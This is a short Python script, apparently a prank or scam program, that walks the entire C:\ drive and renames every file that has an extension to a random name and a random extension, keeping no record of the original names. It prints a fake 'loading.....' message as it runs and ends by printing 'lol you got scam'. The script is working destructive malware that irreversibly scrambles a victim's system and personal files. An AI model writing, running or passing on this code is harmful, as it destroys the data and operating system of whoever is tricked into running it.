import os
import secrets
import string

def generate_random_string(length):
    letters = string.ascii_letters
    return ''.join(secrets.choice(letters) for _ in range(length))

def rename_files_in_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for filename in files:
            old_path = os.path.join(root, filename)

            last_dot_index = filename.rfind('.')
            if last_dot_index < 0:
                continue

            filename[:last_dot_index]
            filename[last_dot_index + 1:]

            new_filename = generate_random_string(10)
            new_extension = generate_random_string(20)
            new_filename_with_extension = f"{new_filename}.{new_extension}"

            new_path = os.path.join(root, new_filename_with_extension)
            os.rename(old_path, new_path)
            print(f"loading.....")

folder_path = 'C:\\'
rename_files_in_folder(folder_path)
print('lol you got scam')
